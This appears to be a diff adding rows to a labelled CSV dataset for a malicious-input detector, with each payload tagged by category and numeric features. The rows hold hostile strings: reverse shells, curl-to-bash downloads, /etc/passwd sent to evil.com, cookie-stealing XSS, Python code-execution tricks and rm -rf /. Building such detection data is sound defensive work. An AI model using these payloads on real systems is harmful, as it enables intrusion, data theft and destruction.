+1 AND 1=2,STRING,MALICIOUS,LOW,2.7255,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+' OR 'unusual'='unusual,STRING,MALICIOUS,LOW,3.0666,0.0,0,0,1,0.1,0,0,0,0,0.0,0.087,0.3043,sql_injection
+; ls -la,STRING,MALICIOUS,LOW,2.5,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.5,command_injection
+; cat /etc/passwd,STRING,MALICIOUS,LOW,3.3816,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.2941,command_injection
+; id,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.5,command_injection
+; whoami,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.25,command_injection
+&& id,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.6,command_injection
+&& whoami,STRING,MALICIOUS,LOW,2.9477,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.3333,command_injection
+&& cat /etc/shadow,STRING,MALICIOUS,LOW,3.5033,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.3333,command_injection
+| id,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,command_injection
+| whoami,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+| cat /etc/passwd,STRING,MALICIOUS,LOW,3.3816,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.2941,command_injection
+; wget http://evil.com/shell.sh -O /tmp/shell.sh,STRING,MALICIOUS,LOW,4.0103,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0208,0.3125,command_injection
+; curl http://evil.com/shell.sh | bash,STRING,MALICIOUS,LOW,4.1556,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.3158,command_injection
+; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,STRING,MALICIOUS,LOW,4.0939,0.0,0,0,1,0.5,1,0,1,0,0.275,0.0,0.45,command_injection
+; nc -e /bin/sh 10.0.0.1 4444,STRING,MALICIOUS,LOW,3.647,0.0,0,0,1,0.5,1,0,1,0,0.3103,0.0,0.4138,command_injection
+; rm -rf /tmp/*,STRING,MALICIOUS,LOW,3.1899,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.5333,command_injection
+; chmod 777 /etc/passwd,STRING,MALICIOUS,LOW,3.7623,0.0,0,0,1,0.5,1,0,1,0,0.1304,0.0,0.2609,command_injection
+$(id),STRING,MALICIOUS,LOW,2.3219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.6,command_injection
+`id`,STRING,MALICIOUS,LOW,1.5,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,command_injection
+$(whoami),STRING,MALICIOUS,LOW,3.1699,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,command_injection
+`whoami`,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+"; python3 -c 'import pty; pty.spawn(""/bin/bash"")'",STRING,MALICIOUS,LOW,4.3753,0.0,0,0,1,0.5,1,0,1,0,0.0204,0.0,0.3469,command_injection
+| ncat 10.0.0.1 4444 -e /bin/bash,STRING,MALICIOUS,LOW,3.859,0.0,0,0,1,0.5,1,0,1,0,0.2727,0.0,0.3636,command_injection
+; /bin/sh -i,STRING,MALICIOUS,LOW,3.085,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.5,command_injection
+&& /bin/bash -i,STRING,MALICIOUS,LOW,3.2402,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.4667,command_injection
+| mail -s test attacker@evil.com < /etc/passwd,STRING,MALICIOUS,LOW,4.135,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2826,command_injection
+; echo hacked > /var/www/html/hacked.txt,STRING,MALICIOUS,LOW,4.0276,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.275,command_injection
+&& curl -d @/etc/passwd http://evil.com,STRING,MALICIOUS,LOW,4.3236,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.359,command_injection
+; tar czf /tmp/etc.tar.gz /etc,STRING,MALICIOUS,LOW,3.6029,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.3333,command_injection
+| awk '{print}' /etc/passwd,STRING,MALICIOUS,LOW,4.0603,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3704,command_injection
+; find / -name '*.conf' -exec cat {} \\;,STRING,MALICIOUS,LOW,4.0478,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0,0.5128,command_injection
+&& env,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.5,command_injection
+; printenv,STRING,MALICIOUS,LOW,3.1219,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.2,command_injection
+; set,STRING,MALICIOUS,LOW,2.3219,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.4,command_injection
+<img src=x onerror=alert(1)>,STRING,MALICIOUS,LOW,4.107,0.0,0,0,1,0.3,0,0,0,0,0.0357,0.0,0.2857,xss
+<svg onload=alert(1)>,STRING,MALICIOUS,LOW,4.1066,0.0,0,0,1,0.3,0,0,0,0,0.0476,0.0,0.2857,xss
+javascript:alert(1),STRING,MALICIOUS,LOW,3.7871,0.0,0,0,1,0.3,0,0,0,0,0.0526,0.0,0.1579,xss
+<iframe src=javascript:alert(1)>,STRING,MALICIOUS,LOW,4.1875,0.0,0,0,1,0.3,0,0,0,0,0.0312,0.0,0.2188,xss
+"'""><script>alert(document.cookie)</script>",STRING,MALICIOUS,LOW,4.3024,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2619,xss
+<body onload=alert(1)>,STRING,MALICIOUS,LOW,3.9706,0.0,0,0,1,0.3,0,0,0,0,0.0455,0.0,0.2727,xss
+<input onfocus=alert(1) autofocus>,STRING,MALICIOUS,LOW,4.1241,0.0,0,0,1,0.3,0,0,0,0,0.0294,0.0,0.2059,xss
+<video><source onerror=alert(1)>,STRING,MALICIOUS,LOW,4.0122,0.0,0,0,1,0.3,0,0,0,0,0.0312,0.0,0.25,xss
+<audio src=x onerror=alert(1)>,STRING,MALICIOUS,LOW,4.0947,0.0,0,0,1,0.3,0,0,0,0,0.0333,0.0,0.2667,xss
+<details open ontoggle=alert(1)>,STRING,MALICIOUS,LOW,4.0542,0.0,0,0,1,0.3,0,0,0,0,0.0312,0.0,0.2188,xss
+'-alert(1)-',STRING,MALICIOUS,LOW,3.2516,0.0,0,0,1,0.1,0,0,0,0,0.0833,0.0,0.5,xss
+"""-alert(1)-""",STRING,MALICIOUS,LOW,3.2516,0.0,0,0,1,0.1,0,0,0,0,0.0833,0.0,0.5,xss
+<svg><script>alert(1)</script></svg>,STRING,MALICIOUS,LOW,3.9058,0.0,0,0,1,0.3,0,0,0,0,0.0278,0.0,0.3333,xss
+<ScRiPt>alert(1)</sCrIpT>,STRING,MALICIOUS,LOW,4.3239,0.0,0,0,1,0.3,0,0,0,0,0.04,0.24,0.28,xss
+<script>document.cookie</script>,STRING,MALICIOUS,LOW,3.9292,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.1875,xss
+<script>window.location='http://evil.com/?c='+document.cookie</script>,STRING,MALICIOUS,LOW,4.453,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2571,xss
+<img src=x onerror=document.location='http://evil.com/?c='+document.cookie>,STRING,MALICIOUS,LOW,4.4834,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2533,xss
+<script>eval(atob('YWxlcnQoMSk='))</script>,STRING,MALICIOUS,LOW,4.647,0.0,0,0,1,0.5,1,0,0,1,0.0,0.1163,0.2791,xss
+"<script>setTimeout('alert(1)',0)</script>",STRING,MALICIOUS,LOW,4.269,0.0,0,0,1,0.3,0,0,0,0,0.0488,0.0244,0.2927,xss
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",STRING,MALICIOUS,LOW,4.363,0.0,0,0,1,0.65,1,1,0,1,0.3704,0.0556,0.2222,xss
+__import__('os').system('id'),STRING,MALICIOUS,LOW,3.7285,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.4483,python_attack
+"exec(compile('import os', 'f', 'exec'))",STRING,MALICIOUS,LOW,3.8653,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.3846,python_attack
+"eval(compile('__import__(""os"")', 'f', 'eval'))",STRING,MALICIOUS,LOW,4.1478,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.4783,python_attack
+"getattr(__builtins__, 'exec')('import os')",STRING,MALICIOUS,LOW,4.2228,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.3571,python_attack
+pickle.loads(b'\\x80\\x04\\x95'),STRING,MALICIOUS,LOW,4.3232,0.0,0,0,1,0.5,1,0,0,1,0.2069,0.0,0.2759,python_attack
+marshal.loads(b'\\xe3'),STRING,MALICIOUS,LOW,3.9706,0.0,0,0,1,0.5,1,0,0,1,0.0455,0.0,0.2727,python_attack
+__builtins__.__dict__['eval']('1+1'),STRING,MALICIOUS,LOW,3.9823,0.0,0,0,1,0.5,1,0,0,1,0.0556,0.0,0.5,python_attack
+(lambda: __import__('os').system('id'))(),STRING,MALICIOUS,LOW,4.1012,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.4634,python_attack
+"subprocess.Popen(['cat', '/etc/passwd'], stdout=-1)",STRING,MALICIOUS,LOW,4.4464,0.0,0,0,1,0.5,1,0,0,1,0.0196,0.0196,0.3333,python_attack
+os.popen('id').read(),STRING,MALICIOUS,LOW,3.6304,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.381,python_attack
+open('/etc/passwd').read(),STRING,MALICIOUS,LOW,3.9022,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3462,python_attack
+open('/etc/shadow').read(),STRING,MALICIOUS,LOW,3.9791,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3462,python_attack
+__import__('subprocess').check_output(['id']),STRING,MALICIOUS,LOW,4.1999,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.3556,python_attack
+os.system('curl http://evil.com | bash'),STRING,MALICIOUS,LOW,4.4342,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0,0.325,python_attack
+"subprocess.check_output('id', shell=True)",STRING,MALICIOUS,LOW,4.3147,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0244,0.2195,python_attack
+"os.execve('/bin/sh', ['/bin/sh'], {})",STRING,MALICIOUS,LOW,4.1957,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0,0.5135,python_attack
+__import__('pty').spawn('/bin/bash'),STRING,MALICIOUS,LOW,4.0934,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0,0.4167,python_attack
+ctypes.CDLL(None).system(b'id'),STRING,MALICIOUS,LOW,4.1958,0.0,0,0,1,0.5,1,0,0,1,0.0,0.1613,0.2581,python_attack
+importlib.import_module('os').system('id'),STRING,MALICIOUS,LOW,4.023,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.2619,python_attack
+vars()['__builtins__']['__import__']('os').system('id'),STRING,MALICIOUS,LOW,4.1109,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.4909,python_attack
+exec,IDENTIFIER,MALICIOUS,LOW,1.5,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0,known_malicious
+eval,IDENTIFIER,MALICIOUS,LOW,2.0,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0,known_malicious
+__import__,IDENTIFIER,MALICIOUS,LOW,2.5219,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.4,known_malicious
+compile,IDENTIFIER,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0,known_malicious
+SELECT * FROM users,STRING,MALICIOUS,LOW,3.7871,0.0,0,0,1,0.35,0,1,0,0,0.0,0.5263,0.2105,known_malicious
+DROP TABLE students,STRING,MALICIOUS,LOW,3.9321,0.0,0,0,1,0.35,0,1,0,0,0.0,0.4737,0.1053,known_malicious
+1=1--,STRING,MALICIOUS,LOW,1.5219,0.0,0,0,0,0.15,0,1,0,0,0.4,0.0,0.6,known_malicious
+UNION SELECT NULL--,STRING,MALICIOUS,LOW,3.3264,0.0,0,0,1,0.15,0,1,0,0,0.0,0.7895,0.2105,known_malicious
+; rm -rf /,STRING,MALICIOUS,LOW,2.6464,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.6,known_malicious
+&& cat /etc/passwd,STRING,MALICIOUS,LOW,3.3921,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.3333,known_malicious
+wget http://evil.com,STRING,MALICIOUS,LOW,3.8842,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.25,known_malicious
+bash -i >& /dev/tcp/,STRING,MALICIOUS,LOW,3.8464,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.45,known_malicious
+pickle.loads,IDENTIFIER,MALICIOUS,LOW,3.4183,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0833,known_malicious
+subprocess.call,IDENTIFIER,MALICIOUS,LOW,3.3232,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0667,known_malicious
+os.system,IDENTIFIER,MALICIOUS,LOW,2.6416,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.1111,known_malicious
+marshal.loads,IDENTIFIER,MALICIOUS,LOW,3.027,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.0769,known_malicious
